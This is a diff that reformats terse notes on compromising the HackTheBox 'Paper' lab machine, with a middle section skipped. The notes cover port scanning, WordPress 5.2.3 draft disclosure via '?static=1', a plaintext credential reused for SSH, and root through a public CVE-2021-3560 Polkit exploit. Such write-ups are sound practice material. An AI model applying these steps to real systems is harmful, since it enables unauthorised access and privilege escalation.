@@ -1,28 +1,26 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Paper
-# 25/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.11.143
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
 80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
 
-----------------------------------------------------
 # burp
-----------------------------------------------------
 on http header found office.paper
 └─$ sudo nano /etc/hosts            
 on office.paper wp is running 5.2.3 version
 
-----------------------------------------------------
 # exploit 
-----------------------------------------------------
 └─$ searchsploit wordpress 5.2.3
 office.paper/?static=1
 
@@ -40,9 +38,7 @@ dwight:Queenofblad3s!23
 
 try to ssh it we got user shell
 
-----------------------------------------------------
 # after running linpease there is cve
-----------------------------------------------------
 https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh
 [dwight@paper ~]$ ./expl -p=root
 try multiple times
